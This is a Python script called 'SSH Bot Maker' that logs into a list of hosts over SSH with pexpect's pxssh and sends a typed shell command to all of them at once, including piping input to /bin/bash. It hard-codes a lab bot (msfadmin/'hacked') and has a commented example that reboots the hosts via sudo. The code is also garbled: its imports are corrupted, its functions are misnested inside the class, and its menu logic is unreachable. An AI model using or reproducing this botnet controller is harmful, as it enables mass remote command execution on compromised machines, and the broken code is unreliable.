import pxssh
import sysh
import osh
from colorama import Fore, Back, Styleh
from pexpect import pxsshh

os.system('clear')

print("")
print('-'*30+"SSH Bot Maker"+'-'*30)
print(Fore.GREEN+"")
print("1. List bots")
print("2. Issue a command")
print("3. Bash")
print("4. Exit")

option = input("Enter any option:")

#Creating client instance
class Client:

    def __init__(self, host, user, password):
        self.host=host
        self.user=user
        self.password=password
        self.session=self.connect()

    #connecting to the ssh server
    def connect(self):
        try:
            s=pxssh.pxssh()
            s.login(self.host,self.user,self.password)
            return s
        except Exception as e:
            print(e)
            print(Fore.RED+"[-]Error connecting")

    #Sending a command to execute
    def send_command(self,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

    #Running through the loop so that it can travese the complete clients
    def botnetCommand(command):
        for client in botnet:
            output = client.send_command(command)
            print("[*]Output from") + client.host
            print("[+]<<<") + output

    #Adding new clients to botnet
    def addclient(host,user,password):
        client=Client(host,user,password)
        botnet.append(client)

    #Input command to run
    def askforcommand():
        run = input(Fore.GREEN+"Enter a command to run:")
        botnetCommand(run)

#Input command to run in bash

    def bash():
        bash = input(">>>:")
        botnetCommand('echo %s | /bin/bash' %bash)
        botnet = []
        #add your bot computers
        addclient('192.168.56.101','msfadmin','hacked')
        #when required a password for a command use the below syntax
        #echo |sudo -S
        #botnetCommand('echo hacked | sudo -S reboot')
        
        if option =='1':
            n = len(botnet)
            for i in range(0,n):
                print(str(botnet[i]))
                i=i+1
        
        elif option == '2':
            while True:
                askforcommand()
        
        elif option == '3':
            while True:
                bash()
        
        else:
            sys.exit()